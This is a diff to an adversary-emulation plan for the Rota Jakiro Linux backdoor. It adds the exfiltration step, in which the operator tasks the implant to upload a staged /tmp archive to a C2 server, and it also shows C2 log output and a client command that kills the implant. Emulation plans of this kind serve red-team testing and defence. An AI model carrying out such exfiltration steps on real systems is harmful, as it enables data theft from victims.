@@ -683,6 +683,10 @@ Rota Jakiro confirms the target file were created
 ## Step 6 - Exfil from Linux Host
 ### 📖 Overview
 
+The final step of the emulation plan is to exfiltrate the staged file in the `/tmp/` directory.
+Task the implant to upload the `/tmp/rota.tar.gz` file to the C2 server.
+
+*Note, the C2 server is limited to recieve data up to but not exceeding 65535 bytes.*
 
 ---
 ### 👾 Red Team Procedures
@@ -699,10 +703,11 @@ Rota Jakiro confirms the target file were created
    [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
    [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
    ```
-1. Viefity on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
+1. Verify on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
    ```
    ls -lart ./files
    ```
+      
 1. Kill Rota Jakiro and give yourself a high five 🙌, mission accomplished! 💃
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_exit"}'
